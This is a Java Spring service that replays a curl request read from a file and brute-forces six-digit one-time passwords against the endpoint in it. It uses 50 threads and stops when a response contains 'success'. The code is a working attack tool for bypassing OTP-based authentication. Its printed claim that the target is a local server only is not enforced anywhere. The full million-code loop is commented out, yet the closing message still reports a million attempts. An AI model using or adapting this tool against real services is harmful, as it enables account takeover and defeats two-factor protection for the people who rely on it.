package com.example.test_reactive_spring.service.impl;
import com.example.test_reactive_spring.dto.CurlResponse;

import okhttp3.*;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class CurlExecutorService {

    private static final String DEFAULT_CURL_FILE_PATH = "src/main/resources/curl_request.txt";
    private static final String OTP_PLACEHOLDER = "__OTP_PLACEHOLDER__";
    private static final int THREAD_POOL_SIZE = 50; // Adjust based on your local server capacity

    private static final Pattern URL_PATTERN = Pattern.compile("^curl\\s+'(https?://[^']+)'");
    private static final Pattern HEADER_PATTERN = Pattern.compile("-H\\s+'([^:]+):\\s*(.+?)'");
    private static final Pattern COOKIE_PATTERN = Pattern.compile("-b\\s+'(.+?)'");
    private static final Pattern DATA_RAW_PATTERN = Pattern.compile("--data-raw\\s+'(.+?)'");

    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    private final AtomicBoolean foundSuccess = new AtomicBoolean(false);

    // === 1. Execute single curl from file (original behavior) ===
    public CurlResponse executeCurlFromFile() throws IOException {
        String curlCommand = readCurlFromFile(DEFAULT_CURL_FILE_PATH);
        return executeCurlCommand(curlCommand);
    }

    // === 2. Brute-force all 6-digit OTPs using curl template ===
    public void bruteForceOtps() {
        try {
            String curlTemplate = readCurlFromFile(DEFAULT_CURL_FILE_PATH);

            if (!curlTemplate.contains(OTP_PLACEHOLDER)) {
                System.err.println("Error: curl_request.txt must contain OTP placeholder: " + OTP_PLACEHOLDER);
                return;
            }

            System.out.println("\n=== Starting OTP Brute-Force (000000 to 999999) ===");
            System.out.println("Target: LOCAL server only");
            System.out.println("Threads: " + THREAD_POOL_SIZE);
            System.out.println("Will stop on first successful OTP\n");

            long startTime = System.currentTimeMillis();

            ExecutorService executor = Executors.newFixedThreadPool(THREAD_POOL_SIZE);
            CompletionService<String> completionService = new ExecutorCompletionService<>(executor);

            int submitted = 0;
//            for (int i = 0; i < 1_000_000; i++) {
            for (int i = 0; i < 20; i++) {
                if (foundSuccess.get()) break;

                final String otp = String.format("%06d", i);
                final String modifiedCurl = curlTemplate.replace(OTP_PLACEHOLDER, otp);

                completionService.submit(() -> {
                    if (foundSuccess.get()) return null;

                    try {
                        CurlResponse response = executeCurlCommand(modifiedCurl);
                        // === CUSTOMIZE THIS SUCCESS CONDITION ===
                        boolean isSuccess = response.getStatusCode() == 200
                                && response.getBody() != null
                                && response.getBody().toLowerCase().contains("success"); // or "valid", "logged in", etc.

                        if (isSuccess) {
                            foundSuccess.set(true);
                            return String.format("[%-6s] SUCCESS (%d): %s", otp, response.getStatusCode(),
                                    response.getBody().trim());
                        }
                        System.out.println("fail");
                        return null;
                    } catch (Exception e) {
                        return String.format("[%-6s] ERROR: %s", otp, e.getMessage());
                    }
                });

                submitted++;
            }

            String winningResult = null;
            for (int i = 0; i < submitted; i++) {
                try {
                    Future<String> future = completionService.take();
                    String result = future.get();
                    if (result != null) {
                        System.out.println(result);
                        if (result.contains("SUCCESS")) {
                            winningResult = result;
                            break;
                        }
                    }
                } catch (Exception ignored) {}
            }

            executor.shutdownNow();
            try {
                executor.awaitTermination(10, TimeUnit.SECONDS);
            } catch (InterruptedException ignored) {}

            long endTime = System.currentTimeMillis();
            double duration = (endTime - startTime) / 1000.0;

            if (winningResult != null) {
                System.out.printf("%n*** OTP CRACKED! %s ***%n", winningResult);
            } else {
                System.out.println("\nNo valid OTP found after 1,000,000 attempts.");
            }
            System.out.printf("Completed in %.2f seconds.%n", duration);
            System.out.println("=== Brute-Force Finished ===\n");

        } catch (Exception e) {
            System.err.println("Brute-force failed: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // === 3. Execute a single modified curl command (used internally) ===
    private CurlResponse executeCurlCommand(String curlCommand) throws IOException {
        // Extract URL
        Matcher urlMatcher = URL_PATTERN.matcher(curlCommand);
        if (!urlMatcher.find()) {
            throw new IllegalArgumentException("Could not find URL in curl command");
        }
        String url = urlMatcher.group(1);

        // Extract headers
        Headers.Builder headersBuilder = new Headers.Builder();
        Matcher headerMatcher = HEADER_PATTERN.matcher(curlCommand);
        while (headerMatcher.find()) {
            String key = headerMatcher.group(1).trim();
            String value = headerMatcher.group(2).trim();
            headersBuilder.add(key, value);
        }

        // Extract cookies
        Matcher cookieMatcher = COOKIE_PATTERN.matcher(curlCommand);
        if (cookieMatcher.find()) {
            headersBuilder.add("Cookie", cookieMatcher.group(1));
        }

        // Extract body and replace if needed (already done outside for brute-force)
        String jsonBody = null;
        Matcher dataMatcher = DATA_RAW_PATTERN.matcher(curlCommand);
        if (dataMatcher.find()) {
            jsonBody = dataMatcher.group(1);
        }

        Request.Builder requestBuilder = new Request.Builder()
                .url(url)
                .headers(headersBuilder.build());

        if (jsonBody != null && !jsonBody.trim().isEmpty()) {
            RequestBody body = RequestBody.create(jsonBody, MediaType.get("application/json; charset=utf-8"));
            requestBuilder.post(body);
        } else {
            requestBuilder.get();
        }

        Request request = requestBuilder.build();

        try (Response response = client.newCall(request).execute()) {
            String respHeaders = response.headers().toMultimap().toString();
            String respBody = response.body() != null ? response.body().string() : "";
            return new CurlResponse(response.code(), respHeaders, respBody);
        }
    }

    private String readCurlFromFile(String filePath) throws IOException {
        return Files.readString(Paths.get(filePath)).trim();
    }
}
